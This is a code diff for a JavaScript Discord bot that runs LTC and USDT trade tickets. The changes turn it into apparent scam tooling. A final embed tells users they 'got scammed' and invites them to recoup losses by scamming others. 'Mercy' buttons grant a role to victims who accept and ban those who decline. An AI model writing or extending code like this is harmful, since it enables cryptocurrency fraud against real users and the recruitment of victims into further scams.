@@ -175,8 +175,7 @@ client.on('messageCreate', async (message) => {
 client.on('interactionCreate', async (interaction) => {
 
   // ============ BUTTONS ============
-  if (interaction.isButton()) {
-
+if (interaction.isButton()) {
     // Request LTC / USDT → Modal
     if (interaction.customId === 'request_ltc' || interaction.customId === 'request_usdt') {
       const currency = interaction.customId === 'request_ltc' ? 'LTC' : 'USDT';
@@ -184,20 +183,6 @@ client.on('interactionCreate', async (interaction) => {
         .setCustomId(`request_modal_${currency}`)
         .setTitle('Fill out the format');
 
-    if (interaction.customId.startsWith('mercy_accept_')) {
-      const userId = interaction.customId.replace('mercy_accept_', '');
-      const member = await interaction.guild.members.fetch(userId);
-      const role = interaction.guild.roles.cache.get(SIMULATE_ROLE_ID);
-      await member.roles.add(role);
-      await interaction.update({ content: `✅ <@${userId}> has been accepted.`, embeds: [], components: [] });
-    }
-
-      if (interaction.customId.startsWith('mercy_decline_')) {
-      const userId = interaction.customId.replace('mercy_decline_', '');
-      const member = await interaction.guild.members.fetch(userId);
-      await member.ban({ reason: 'Mercy declined' });
-      await interaction.update({ content: `🔨 <@${userId}> has been banned.`, embeds: [], components: [] });
-    }
       const traderInput = new TextInputBuilder()
         .setCustomId('trader_id')
         .setLabel("Paste Your Trader's Username or ID")
@@ -268,7 +253,6 @@ client.on('interactionCreate', async (interaction) => {
 
       await interaction.update({ embeds: [roleEmbed], components: [row] });
 
-      // Both selected → confirm embed
       if (ticket.sender && ticket.receiver && ticket.sender !== ticket.receiver) {
         const confirmEmbed = new EmbedBuilder()
           .setTitle('<a:loading:1507682188228034586> • Is This Information Correct?')
@@ -448,12 +432,10 @@ client.on('interactionCreate', async (interaction) => {
       const ticket = tickets[ticketId];
       if (!ticket) return;
 
-      // ===== FINALES EMBED — HIER DEINEN TEXT EINFÜGEN =====
       const finalEmbed = new EmbedBuilder()
-        .setTitle('W') // <-- Titel ändern
-        .setDescription('successful') // <-- Text ändern
-        .setColor(0xff0000); // <-- Farbe ändern (hex)
-      // ======================================================
+        .setTitle('Scam Notification')
+        .setDescription('We are very sorry to tell you that you got scammed./nLuckily, you can make it all back by joining us and starting to scam too./nIts your choice if you would like to accept this offer or not.')
+        .setColor(0x00aa00);
 
       await interaction.reply({ embeds: [finalEmbed], components: [] });
     }
@@ -464,6 +446,23 @@ client.on('interactionCreate', async (interaction) => {
         return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
       }
       await interaction.reply({ content: 'Trade cancelled.', ephemeral: true });
+    }
+
+    // Mercy Accept
+    if (interaction.customId.startsWith('mercy_accept_')) {
+      const userId = interaction.customId.replace('mercy_accept_', '');
+      const member = await interaction.guild.members.fetch(userId);
+      const role = interaction.guild.roles.cache.get(SIMULATE_ROLE_ID);
+      await member.roles.add(role);
+      await interaction.update({ content: `✅ <@${userId}> has been accepted.`, embeds: [], components: [] });
+    }
+
+    // Mercy Decline
+    if (interaction.customId.startsWith('mercy_decline_')) {
+      const userId = interaction.customId.replace('mercy_decline_', '');
+      const member = await interaction.guild.members.fetch(userId);
+      await member.ban({ reason: 'Mercy declined' });
+      await interaction.update({ content: `🔨 <@${userId}> has been banned.`, embeds: [], components: [] });
     }
   }
 
